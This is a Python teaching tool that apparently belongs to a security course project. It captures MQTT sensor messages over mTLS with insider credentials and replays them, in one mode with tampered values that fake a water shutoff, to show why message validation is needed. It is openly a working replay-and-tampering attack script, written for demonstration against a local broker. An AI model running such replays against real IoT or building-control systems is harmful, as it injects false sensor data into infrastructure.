"""
replay_attacker.py - Replay Attack Simulation Tool

Captures legitimate MQTT messages from your mTLS pipeline and replays
them later to demonstrate why message validation is needed.

This simulates an insider threat: someone with valid mTLS credentials
who records messages and re-sends them.

Usage:
    python replay_attacker.py --mode capture --count 5
    python replay_attacker.py --mode replay
    python replay_attacker.py --mode replay-delayed --delay 60
    python replay_attacker.py --mode replay-modified

Modes:
    capture          - Subscribe and save messages to captured_messages.json
    replay           - Replay captured messages immediately
    replay-delayed   - Wait before replaying (default: 60 seconds)
    replay-modified  - Replay with modified sensor values (tampering)
"""

import paho.mqtt.client as mqtt
import ssl
import json
import time
import argparse
import sys
import os
import copy
import random
from datetime import datetime, timezone

# Handle paho-mqtt 2.0+ API change
try:
    MQTT_CLIENT_ARGS = {"callback_api_version": mqtt.CallbackAPIVersion.VERSION1}
except AttributeError:
    MQTT_CLIENT_ARGS = {}

# =============================================================================
# Configuration
# =============================================================================
BROKER_HOST = "localhost"
BROKER_PORT = 8883

# mTLS certificates (attacker has valid credentials — insider threat)
CA_CERT = "certs/ca.pem"
CLIENT_CERT = "certs/device-001.pem"
CLIENT_KEY = "certs/device-001-key.pem"

# Capture settings
TOPIC = "hydroficient/grandmarina/#"
CAPTURE_FILE = "captured_messages.json"


# =============================================================================
# Capture Mode
# =============================================================================
captured_messages = []
capture_count = 0
capture_target = 5


def on_connect_capture(client, userdata, flags, rc):
    """Called when connected for message capture."""
    if rc == 0:
        print(f"[CONNECTED] Listening on: {TOPIC}")
        client.subscribe(TOPIC, qos=1)
    else:
        print(f"[ERROR] Connection failed with code {rc}")


def on_message_capture(client, userdata, msg):
    """Called when a message is captured."""
    global capture_count

    try:
        data = json.loads(msg.payload.decode())
        capture_count += 1

        captured = {
            "topic": msg.topic,
            "payload": data,
            "captured_at": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
            "original_payload_bytes": msg.payload.decode()
        }
        captured_messages.append(captured)

        device = data.get("device_id", "Unknown")
        flow = data.get("readings", {}).get("flow_rate", "N/A")
        print(f"[CAPTURED {capture_count}/{capture_target}] {device} - {flow} LPM")

        if capture_count >= capture_target:
            print(f"\n[DONE] Captured {capture_count} messages")
            print(f"[SAVED] {CAPTURE_FILE}")
            client.disconnect()

    except json.JSONDecodeError:
        print(f"[CAPTURED] Non-JSON message on {msg.topic}")


def run_capture(count):
    """Capture messages from the pipeline."""
    global capture_target
    capture_target = count

    print("=" * 60)
    print("REPLAY ATTACK TOOL - Capture Mode")
    print("=" * 60)
    print(f"Target: {count} messages")
    print(f"Output: {CAPTURE_FILE}")
    print("=" * 60)

    client = mqtt.Client(client_id="replay-attacker-capture", **MQTT_CLIENT_ARGS)
    client.on_connect = on_connect_capture
    client.on_message = on_message_capture

    try:
        client.tls_set(
            ca_certs=CA_CERT,
            certfile=CLIENT_CERT,
            keyfile=CLIENT_KEY,
            cert_reqs=ssl.CERT_REQUIRED,
            tls_version=ssl.PROTOCOL_TLS
        )
    except FileNotFoundError as e:
        print(f"[ERROR] Certificate not found: {e}")
        print("[ERROR] Make sure your Project 5 certs/ directory is set up")
        return
    except Exception as e:
        print(f"[ERROR] TLS configuration failed: {e}")
        return

    print(f"\n[CONNECTING] {BROKER_HOST}:{BROKER_PORT}...")
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")
        return

    print("[LISTENING] Waiting for messages to capture...\n")
    try:
        client.loop_forever()
    except KeyboardInterrupt:
        print(f"\n[STOPPED] Captured {capture_count} messages")

    # Save captured messages
    with open(CAPTURE_FILE, "w") as f:
        json.dump(captured_messages, f, indent=2)

    print(f"[SAVED] {len(captured_messages)} messages saved to {CAPTURE_FILE}")


# =============================================================================
# Replay Mode
# =============================================================================
def run_replay():
    """Replay captured messages immediately."""
    print("=" * 60)
    print("REPLAY ATTACK TOOL - Replay Mode")
    print("=" * 60)

    # Load captured messages
    if not os.path.exists(CAPTURE_FILE):
        print(f"[ERROR] {CAPTURE_FILE} not found!")
        print("[ERROR] Run capture mode first: python replay_attacker.py --mode capture")
        return

    with open(CAPTURE_FILE, "r") as f:
        messages = json.load(f)

    print(f"Loaded {len(messages)} captured messages")
    print("=" * 60)

    client = mqtt.Client(client_id="replay-attacker", **MQTT_CLIENT_ARGS)

    try:
        client.tls_set(
            ca_certs=CA_CERT,
            certfile=CLIENT_CERT,
            keyfile=CLIENT_KEY,
            cert_reqs=ssl.CERT_REQUIRED,
            tls_version=ssl.PROTOCOL_TLS
        )
    except FileNotFoundError as e:
        print(f"[ERROR] Certificate not found: {e}")
        return

    print(f"\n[CONNECTING] {BROKER_HOST}:{BROKER_PORT}...")
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")
        return

    client.loop_start()
    time.sleep(1)

    print("\n[REPLAYING] Sending captured messages...\n")

    for i, msg in enumerate(messages, 1):
        # Send the EXACT original payload (no modifications)
        payload = msg["original_payload_bytes"]
        topic = msg["topic"]

        result = client.publish(topic, payload, qos=1)
        captured_at = msg["captured_at"]
        print(f"[REPLAYING {i}/{len(messages)}] Topic: {topic}")
        print(f"  Originally captured: {captured_at}")
        print(f"  Replayed at: {datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z')}")
        print()

        time.sleep(1)

    print(f"[DONE] Replayed {len(messages)} messages")
    print("[NOTE] Check your subscriber — did it accept them all?")

    client.loop_stop()
    client.disconnect()


# =============================================================================
# Replay Delayed Mode
# =============================================================================
def run_replay_delayed(delay):
    """Wait, then replay captured messages."""
    print("=" * 60)
    print("REPLAY ATTACK TOOL - Delayed Replay Mode")
    print("=" * 60)

    if not os.path.exists(CAPTURE_FILE):
        print(f"[ERROR] {CAPTURE_FILE} not found!")
        print("[ERROR] Run capture mode first: python replay_attacker.py --mode capture")
        return

    with open(CAPTURE_FILE, "r") as f:
        messages = json.load(f)

    print(f"Loaded {len(messages)} captured messages")
    print(f"Delay: {delay} seconds")
    print("=" * 60)

    print(f"\n[WAITING] Delaying {delay} seconds before replay...")
    for remaining in range(delay, 0, -10):
        print(f"  {remaining} seconds remaining...")
        time.sleep(min(10, remaining))

    print("[DELAY COMPLETE] Starting replay...\n")

    client = mqtt.Client(client_id="replay-attacker-delayed", **MQTT_CLIENT_ARGS)

    try:
        client.tls_set(
            ca_certs=CA_CERT,
            certfile=CLIENT_CERT,
            keyfile=CLIENT_KEY,
            cert_reqs=ssl.CERT_REQUIRED,
            tls_version=ssl.PROTOCOL_TLS
        )
    except FileNotFoundError as e:
        print(f"[ERROR] Certificate not found: {e}")
        return

    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")
        return

    client.loop_start()
    time.sleep(1)

    for i, msg in enumerate(messages, 1):
        payload = msg["original_payload_bytes"]
        topic = msg["topic"]

        result = client.publish(topic, payload, qos=1)
        captured_at = msg["captured_at"]
        print(f"[REPLAYING {i}/{len(messages)}] Topic: {topic}")
        print(f"  Originally captured: {captured_at}")
        print(f"  Replayed at: {datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z')}")
        print(f"  Age: {delay}+ seconds old")
        print()

        time.sleep(1)

    print(f"[DONE] Replayed {len(messages)} messages after {delay}s delay")

    client.loop_stop()
    client.disconnect()


# =============================================================================
# Replay Modified Mode
# =============================================================================
def run_replay_modified():
    """Replay captured messages with modified sensor values."""
    print("=" * 60)
    print("REPLAY ATTACK TOOL - Modified Replay Mode")
    print("=" * 60)

    if not os.path.exists(CAPTURE_FILE):
        print(f"[ERROR] {CAPTURE_FILE} not found!")
        print("[ERROR] Run capture mode first: python replay_attacker.py --mode capture")
        return

    with open(CAPTURE_FILE, "r") as f:
        messages = json.load(f)

    print(f"Loaded {len(messages)} captured messages")
    print("Modification: Setting flow_rate to 0.0 (simulating shutoff)")
    print("=" * 60)

    client = mqtt.Client(client_id="replay-attacker-modified", **MQTT_CLIENT_ARGS)

    try:
        client.tls_set(
            ca_certs=CA_CERT,
            certfile=CLIENT_CERT,
            keyfile=CLIENT_KEY,
            cert_reqs=ssl.CERT_REQUIRED,
            tls_version=ssl.PROTOCOL_TLS
        )
    except FileNotFoundError as e:
        print(f"[ERROR] Certificate not found: {e}")
        return

    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")
        return

    client.loop_start()
    time.sleep(1)

    print("\n[REPLAYING] Sending MODIFIED messages...\n")

    for i, msg in enumerate(messages, 1):
        # Modify the payload — change flow_rate to 0
        modified_data = copy.deepcopy(msg["payload"])
        original_flow = modified_data.get("readings", {}).get("flow_rate", "N/A")
        if "readings" in modified_data:
            modified_data["readings"]["flow_rate"] = 0.0

        payload = json.dumps(modified_data, indent=2)
        topic = msg["topic"]

        result = client.publish(topic, payload, qos=1)
        print(f"[REPLAYING {i}/{len(messages)}] Topic: {topic}")
        print(f"  Original flow_rate: {original_flow} LPM")
        print(f"  Modified flow_rate: 0.0 LPM (shutoff attack)")
        print()

        time.sleep(1)

    print(f"[DONE] Replayed {len(messages)} MODIFIED messages")
    print("[WARNING] If your subscriber accepted these, the attacker just")
    print("         faked a water shutoff for the entire hotel.")

    client.loop_stop()
    client.disconnect()


# =============================================================================
# Main
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="Replay Attack Simulation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python replay_attacker.py --mode capture --count 5
    python replay_attacker.py --mode replay
    python replay_attacker.py --mode replay-delayed --delay 60
    python replay_attacker.py --mode replay-modified
        """
    )

    parser.add_argument(
        "--mode",
        choices=["capture", "replay", "replay-delayed", "replay-modified"],
        required=True,
        help="Attack mode"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of messages to capture (capture mode only, default: 5)"
    )
    parser.add_argument(
        "--delay",
        type=int,
        default=60,
        help="Seconds to wait before replaying (replay-delayed mode only, default: 60)"
    )

    args = parser.parse_args()

    if args.mode == "capture":
        run_capture(args.count)
    elif args.mode == "replay":
        run_replay()
    elif args.mode == "replay-delayed":
        run_replay_delayed(args.delay)
    elif args.mode == "replay-modified":
        run_replay_modified()


if __name__ == "__main__":
    main()
